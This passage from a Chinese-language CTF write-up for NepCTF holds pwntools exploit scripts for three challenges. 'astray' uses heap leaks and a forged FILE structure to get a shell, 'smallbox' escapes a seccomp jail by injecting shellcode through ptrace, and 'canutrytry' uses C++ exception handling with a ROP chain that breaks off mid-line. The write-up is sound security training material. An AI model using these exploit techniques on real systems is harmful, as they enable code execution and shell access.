p.sendlineafter(a,b)</span><br><span class="line">shell = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">li = <span class="keyword">lambda</span> offset        :libc_base+offset</span><br><span class="line">lis= <span class="keyword">lambda</span> func          :libc_base+libc.symbols[func]</span><br><span class="line">pi = <span class="keyword">lambda</span> offset        :pie+offset</span><br><span class="line">he = <span class="keyword">lambda</span> offset        :heap_base+offset</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">ggg = <span class="keyword">lambda</span>              :(gdb.attach(p),pause())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manwrite</span>(<span class="params">index,concent</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;(1:manager 1000:user)\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;visit user(MANAGER_visit)\n&#x27;</span>,<span class="string">b&#x27;MANAGER_write&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;1-19: manager can visit\n&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    pause()</span><br><span class="line">    s(concent)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manread</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;(1:manager 1000:user)\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;visit user(MANAGER_visit)\n&#x27;</span>,<span class="string">b&#x27;MANAGER_read&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;1-19: manager can visit\n&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visitr</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;(1:manager 1000:user)\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;visit user(MANAGER_visit)\n&#x27;</span>,<span class="string">b&#x27;MANAGER_visit&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;1-19: manager can visit\n&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;2: manager visit user to write to user_logs\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visitw</span>(<span class="params">index,content</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;(1:manager 1000:user)\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;visit user(MANAGER_visit)\n&#x27;</span>,<span class="string">b&#x27;MANAGER_visit&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;1-19: manager can visit\n&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;2: manager visit user to write to user_logs\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    s(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">userr</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;(1:manager 1000:user)\n&#x27;</span>,<span class="string">b&#x27;1000&#x27;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;user write to logs(USER_write)\n&#x27;</span>,<span class="string">b&#x27;USER_read&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;10-19: user can visit\n&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">userw</span>(<span class="params">index,content</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;(1:manager 1000:user)\n&#x27;</span>,<span class="string">b&#x27;1000&#x27;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;user write to logs(USER_write)\n&#x27;</span>,<span class="string">b&#x27;USER_write&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;10-19: user can visit\n&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    pause()</span><br><span class="line">    s(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;(1:manager 1000:user)\n&#x27;</span>,<span class="string">b&#x27;1000&#x27;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;user write to logs(USER_write)\n&#x27;</span>,<span class="string">b&#x27;MANAGER_visit&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;10-19: user can visit\n&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./astray&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process([&quot;./ld-linux-x86-64.so.2&quot;, &quot;./astray&quot;])</span></span><br><span class="line">p = remote(<span class="string">&quot;nepctf32-unsz-rtgi-s43y-ymc9bujpw004.nepctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>)</span><br><span class="line">manread(<span class="number">0</span>)</span><br><span class="line">r(<span class="number">8</span>)</span><br><span class="line">heap_base=uu64()-<span class="number">0x22d0</span></span><br><span class="line">r(<span class="number">2</span>)</span><br><span class="line">pie=uu64()-<span class="number">0x41a0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(pie))</span><br><span class="line">manwrite(<span class="number">2</span>,p64(he(<span class="number">0x4a0</span>+<span class="number">8</span>))+p64(pie+<span class="number">0x4040</span>))</span><br><span class="line">attack(<span class="number">0</span>)</span><br><span class="line">visitw(<span class="number">1</span>,p64(<span class="number">1</span>)+p64(he(<span class="number">0x22d0</span>))+p64(he(<span class="number">0x4a0</span>-<span class="number">0x8</span>)))</span><br><span class="line">visitr(<span class="number">3</span>)</span><br><span class="line">libc_base=uu64()-<span class="number">0x21b6a0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">ogg1=li(<span class="number">0xebc81</span>)</span><br><span class="line">ogg2=li(<span class="number">0xebc85</span>)</span><br><span class="line">ogg3=li(<span class="number">0xebc88</span>)</span><br><span class="line">ogg4=li(<span class="number">0xebce2</span>)</span><br><span class="line">ogg5=li(<span class="number">0xebd38</span>)</span><br><span class="line">ogg6=li(<span class="number">0xebd3f</span>)</span><br><span class="line">ogg7=li(<span class="number">0xebd43</span>)</span><br><span class="line">stdout=lis(<span class="string">&quot;_IO_2_1_stdout_&quot;</span>)</span><br><span class="line">IO_wfile_jumps=libc_base+libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]</span><br><span class="line">setcontext_61=libc_base+libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">61</span></span><br><span class="line">system,binsh=getshell()</span><br><span class="line"></span><br><span class="line">payload=flat(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0x20</span>:p64(<span class="number">1</span>),</span><br><span class="line">        <span class="number">0x18</span>:p64(<span class="number">0</span>),</span><br><span class="line">        <span class="number">0xe0</span>:p64(he(<span class="number">0x9a0</span>+<span class="number">0x50</span>)),</span><br><span class="line">        (<span class="number">0x50</span>+<span class="number">0x18</span>):p64(system),</span><br><span class="line">    &#125;,filler=<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">)</span><br><span class="line">manwrite(<span class="number">7</span>,payload)</span><br><span class="line"></span><br><span class="line">visitw(<span class="number">1</span>,p64(li(<span class="number">0x21b6a0</span>))+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(stdout)+p64(<span class="number">3</span>))</span><br><span class="line">pay=flat(</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">0x0</span>:[<span class="string">b&#x27;/bin/sh\x00&#x27;</span>],     <span class="comment"># rdi=binsh</span></span><br><span class="line"><span class="number">0x20</span>:[p64(<span class="number">0</span>)],            <span class="comment"># write_base</span></span><br><span class="line"><span class="number">0x28</span>:[p64(<span class="number">1</span>)],            <span class="comment"># write_ptr --&gt; ptr &gt; base</span></span><br><span class="line"><span class="number">0xc0</span>:[p64(<span class="number">0</span>)],            <span class="comment"># _mode &lt;= 0</span></span><br><span class="line"><span class="number">0xd8</span>:[p64(IO_wfile_jumps+<span class="number">0x10</span>)],<span class="comment">#vatble</span></span><br><span class="line"><span class="number">0x88</span>:[p64(he(<span class="number">0x600</span>)+<span class="number">0x90</span>)],   <span class="comment"># bypass lock</span></span><br><span class="line"><span class="number">0xa0</span>:[p64(he(<span class="number">0x9a0</span>))]    <span class="comment">#fake wide_data    p-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</span></span><br><span class="line">&#125;,filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">userw(<span class="number">0</span>,pay)</span><br><span class="line">shell()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="smallbox"><a href="#smallbox" class="headerlink" title="smallbox"></a>smallbox</h2><p>这个题只允许了ptrace系统调用，思路很明确，放个网站，exp基本直接照抄就好了，<a href="https://skyeto.com/p/seccomp-jail-escape-using-ptrace">点这里</a></p><p>这里简单说一下思路</p><p>1.attach到子进程，让子进程暂停</p><p>2.将子进程的寄存器状态写到父进程的栈上，泄露出来</p><p>3.将要让子进程执行的shellcode用ptarce系统调用每次4个字节写到子进程的内存里，也就是rip指向的内存（子进程rip的值已经在上一步泄露出来了）</p><p>4.让父进程脱离对子进程的控制</p><p>5.让父进程进入无限循环，让子进程执行shellcoed获得shell</p><p><strong>注意</strong> 要让子进程先执行一下，而且不太稳定，建议连接后稍等一会儿再输入命令</p><p><strong>疑问</strong> 不理解为什么写入子进程的shellcode的前后必须要有nop，貌似没有nop就会失败，很奇怪</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>]</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x0</span></span><br><span class="line">heap_base=<span class="number">0x0</span></span><br><span class="line">pie=<span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getshell</span>() : <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> a : p.recv(a)</span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a  : p.recvuntil(a)</span><br><span class="line">s = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">shell = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">li = <span class="keyword">lambda</span> offset        :libc_base+offset</span><br><span class="line">lis= <span class="keyword">lambda</span> func          :libc_base+libc.symbols[func]</span><br><span class="line">pi = <span class="keyword">lambda</span> offset        :pie+offset</span><br><span class="line">he = <span class="keyword">lambda</span> offset        :heap_base+offset</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">ggg = <span class="keyword">lambda</span>              :(gdb.attach(p),pause())</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = gdb.debug(&#x27;./smallbox&#x27;, &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#     b _start</span></span><br><span class="line"><span class="comment">#     c</span></span><br><span class="line"><span class="comment">#     set follow-fork-mode parent</span></span><br><span class="line"><span class="comment">#     b *$rebase(0x13e2)</span></span><br><span class="line"><span class="comment">#     c</span></span><br><span class="line"><span class="comment"># &#x27;&#x27;&#x27;)</span></span><br><span class="line"><span class="comment"># p=process(&#x27;./smallbox&#x27;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;nepctf32-ameg-qqf5-f9qf-wpvdlbusv409.nepctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">child_shcode = asm(<span class="string">&quot;nop; &quot;</span> * <span class="number">10</span> + <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push   0x42</span></span><br><span class="line"><span class="string">pop    rax</span></span><br><span class="line"><span class="string">inc    ah</span></span><br><span class="line"><span class="string">cqo</span></span><br><span class="line"><span class="string">push   rdx</span></span><br><span class="line"><span class="string">movabs rdi, 0x68732f2f6e69622f</span></span><br><span class="line"><span class="string">push   rdi</span></span><br><span class="line"><span class="string">push   rsp</span></span><br><span class="line"><span class="string">pop    rsi</span></span><br><span class="line"><span class="string">mov    r8, rdx</span></span><br><span class="line"><span class="string">mov    r10, rdx</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov r15, [rsp+8]</span></span><br><span class="line"><span class="string">shr r15, 32</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rax, 101;</span></span><br><span class="line"><span class="string">mov rdi, 16;</span></span><br><span class="line"><span class="string">mov rsi, r15;</span></span><br><span class="line"><span class="string">mov rdx, 0;</span></span><br><span class="line"><span class="string">mov r10, 0;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rax, 101;</span></span><br><span class="line"><span class="string">mov rdi, 12;</span></span><br><span class="line"><span class="string">mov rsi, r15;</span></span><br><span class="line"><span class="string">mov rdx, 0;</span></span><br><span class="line"><span class="string">lea r10, [rsp + 104];</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">payload=asm(payload)</span><br><span class="line"></span><br><span class="line">write_bytes = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(child_shcode), <span class="number">4</span>):</span><br><span class="line">write_bytes += <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov rax, 101;</span></span><br><span class="line"><span class="string">mov rdi, 4;</span></span><br><span class="line"><span class="string">mov rsi, r15;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdx, [rsp + 104 + 128];</span></span><br><span class="line"><span class="string">add rdx, <span class="subst">&#123;i&#125;</span>;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov r10, <span class="subst">&#123;u32(child_shcode[i:i+<span class="number">4</span>].rjust(<span class="number">4</span>,<span class="string">b&quot;0&quot;</span>))&#125;</span>;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">payload += asm(write_bytes)</span><br><span class="line"></span><br><span class="line">payload += asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rax, 101;</span></span><br><span class="line"><span class="string">mov rdi, 17;</span></span><br><span class="line"><span class="string">mov rsi, r15;</span></span><br><span class="line"><span class="string">mov rdx, 0;</span></span><br><span class="line"><span class="string">mov r10, 0;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov eax, 1</span></span><br><span class="line"><span class="string">loop:</span></span><br><span class="line"><span class="string">test eax, 1</span></span><br><span class="line"><span class="string">jne loop;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&#x27;shellcode: \n&#x27;</span>,payload)</span><br><span class="line">sleep(<span class="number">5</span>)</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure><h2 id="canutrytry"><a href="#canutrytry" class="headerlink" title="canutrytry"></a>canutrytry</h2><p>只是一道和C++抛出异常有关的题，之前没见过，看着别人的exp慢慢调的，边调边学，很有意思 <a href="https://www.cnblogs.com/xmiscx/p/19010430#_label0">参考文章</a></p><p>这里就简单放个exp了，<a href="https://gggtaotao.github.io/2025/07/30/pwn-c-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E5%88%A9%E7%94%A8/">具体分析会放在另一篇文章中</a>，连同如何获取配套的依赖库并更换的方法（走了很多坑，大哭呜呜呜）</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-v&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>]</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x0</span></span><br><span class="line">heap_base=<span class="number">0x0</span></span><br><span class="line">pie=<span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getshell</span>() : <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> a : p.recv(a)</span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a  : p.recvuntil(a)</span><br><span class="line">s = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">shell = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">li = <span class="keyword">lambda</span> offset        :libc_base+offset</span><br><span class="line">lis= <span class="keyword">lambda</span> func          :libc_base+libc.symbols[func]</span><br><span class="line">pi = <span class="keyword">lambda</span> offset        :pie+offset</span><br><span class="line">he = <span class="keyword">lambda</span> offset        :heap_base+offset</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">ggg = <span class="keyword">lambda</span>              :(gdb.attach(p),pause())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit_1</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;your choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;your choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit_2</span>(<span class="params">size</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;your choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;your choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit_3</span>(<span class="params">index,content</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;your choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;your choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index:&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leave</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;your choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># p=process(&#x27;./canutrytry&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;nepctf30-re0p-1yod-ovkd-tywcgo6zc386.nepctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>)</span><br><span class="line">visit_2(<span class="number">0x38</span>)</span><br><span class="line">visit_1()</span><br><span class="line">visit_2(-<span class="number">1</span>)</span><br><span class="line">visit_1()</span><br><span class="line">ru(<span class="string">b&#x27;setbufaddr:0x&#x27;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)-<span class="number">0x87fe0</span>-<span class="number">0x80</span></span><br><span class="line">ru(<span class="string">b&#x27;stackaddr:0x&#x27;</span>)</span><br><span class="line">stack=<span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0x405460</span>)+p64(<span class="number">0x401ed9</span>)</span><br><span class="line"></span><br><span class="line">rdi=li(<span class="number">0x000000000002a3e5</span>)</span><br><span class="line">rsi=li(<span class="number">0x000000000002be51</span>)</span><br><span class="line">rdx_r12=li(<span class="number">0x000000000011f497</span>)</span><br><span class="line">write=lis(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">visit_3(<span class="number">0</span>,payload)</span><br><span class="line">leave(<span class="number">0</span>)</span><br><span class="line">payload=p64(rdi)+p64(<span class="number">2</span>)+p64(rsi)+p64(<span class="number">0x4053c0</span>)+p64(rdx_r12)+p64(<span class="number">0x64</span>)+p64(<span 